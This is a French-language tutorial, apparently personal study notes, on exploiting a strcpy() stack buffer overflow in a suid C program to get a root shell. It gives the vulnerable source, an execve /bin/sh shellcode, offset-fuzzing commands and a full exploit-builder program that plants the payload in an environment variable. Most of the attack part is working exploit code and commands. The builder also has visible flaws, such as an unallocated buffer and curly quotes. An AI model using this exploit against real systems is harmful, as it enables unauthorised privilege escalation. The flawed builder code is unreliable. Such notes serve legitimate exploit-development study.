


#### **Théorie**

- La fonction strcpy() ne vérifie pas la taille de ce qu'elle copie ni la taille du buffer dans lequel elle le copie. On va donc pouvoir contourner ça pour modifier l'adresse de retour pour la faire pointer sur notre shellcode qui, lui, va nous donner les droits root.

#### **Pratique**

##### **Exploit 1**

- **Environnement**
	- L'os ne doit pas varier l'adresse de la stack. Donc l'ASLR (Address Space Layout Randomization) ne doit pas être activé.

- **Code source :**
```C
Code 
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]){
	char little_array[512];
	if (argc > 1)
		strcpy(little_array, argv[1]);
}
```

- **Analyse du code source**
	- On voit que notre input (argv) est copié vers un buffer de taille max 512 bytes mais rien ne nous empêche de faire un buffer overflow.

- **Shellcode**
	- `\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68`

- **Exploitation**
	- On ne va même pas lancer gdb dans cet exploit pour s'immerger dans de vraies conditions. Notre but ça va être de devenir root sur la machine (le programme victime doit être suid). On va donc essayer d'injecter un shellcode qui nous lance un shell root. Pour que notre shellcode puisse être exécuté, on va remplacer l'adresse de retour de la stack (main) par l'adresse du début de notre shellcode qui va se trouver dans le début du buffer. Le programme va donc exécuter le shellcode. 
	- Pour ça, on va devoir trouvé l'adresse de début du buffer mais comme on sait que l'adresse de stack (RSP) ne va pas changer (pas d'ASLR), on peut écrire un programme qui la renvoie :
```C
#include <stdio.h>
unsigned long find_start(void){
	__asm__("movl %esp, %eax");
}
int main(){
	printf("0x%x\n", find_start());
}
```
- 
	- Ce script devrait normalement renvoyer toujours la même adresse.
	- On va maintenant tester à partir de quel offset le script victime nous renvoie un segmentation fault pour avoir une idée de la position de l'adresse de retour.
		- `./victim $(printf "%0512x" 0 )`
		-  `./victim $(printf "%0516x" 0 )` 
	- Maintenant qu'on connait la distance de RSP à l'adresse de retour, on va déterminer la taille de l'offset. Notre shellcode fait 40bytes et la distance est de ~520 bytes donc offset = 480 bytes. Étant donné que la fin du buffer va vers  les adresses haute (vers l'adresse de retour), notre adresse qui pointe vers le début de notre shellcode va être à la fin de notre payload. Ça devrait donc ressembler à :
		- `./victim $(printf\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68%0480x\xd8\xfa\xff\xbf)` où tu remarque les 480 bytes d'offset et l'adresse qu'on a trouvé avec notre script à la fin.
	- Normalement, t'as un illegal instruction (si t'as un segmentation fault, change le offset) ça veut dire qu'on exécute bien quelque chose de différent mais l'adresse du début du buffer ne doit pas être la bonne.
	- On va donc faire un script qui adapte l'adresse du début du buffer par rapport à la taille du buffer.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define offset_size 0
#define buffer_size 512
char sc[] =
	"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
	"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
	"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

unsigned long find_start(void){
	__asm__("movl %esp, %eax");   // Renvoie l'adresse de rsp (début)
}
int main(int argc, char *argv[])
{
	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset=offset_size, bsize=buffer_size;
	int i;
	if (argc > 1) bsize = atoi(argv[1]);
	if (argc > 2) offset = atoi(argv[2]);
	addr = find_start() - offset;
	printf(“Attempting address: 0x%x\n”, addr);
	ptr = buff;
	addr_ptr = (long *) ptr;
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;
	ptr += 4;
	for (i = 0; i < strlen(sc); i++)
		*(ptr++) = sc[i];
	buff[bsize - 1] = ‘\0’;
	memcpy(buff,”BUF=”,4);
	putenv(buff);
	system(“/bin/bash”);
}
```

^aadea3

- 
	- Là en fait l'offset est pas vraiment interessant. On peut prendre l'adresse rsp qui va pointer sur bsize car en fait on s'en fout là c'est pas le programme victime, c'est simplement pour imaginer l'adresse de début du buffer cible. La taille du payload (buf) va donc être cohérente avec l'adresse du début du buffer donc pas de calcul nécessaires.
	- On va donc tester plein de valeur de bsize possible. On ne peut pas le deviner du premier coup donc on y va par tatonnement.
	- À la fin du script, ça lance un shell /bin/bash dans lequel la var d'env BUF sera présente. On pourra donc s'en servir comme arguments/payload pour lancer le programme cible. 
		- `./attack 500`
		- `./victim $BUF`
	- Si ca renvoie un segmentation fault, on est allé trop loin donc on a fait un bsize qui est trop grand par rapport au buffer cible. On va donc diminuer la taille de bsize. Par contre, si y'a pas de réponse, la taille de bsize est trop petite car notre payload n'a pas atteint l'adresse de retour.
	- Normalement, quand tu aura trouvé le bon offset, tu auras un shell root qui va spawn ^e206d8
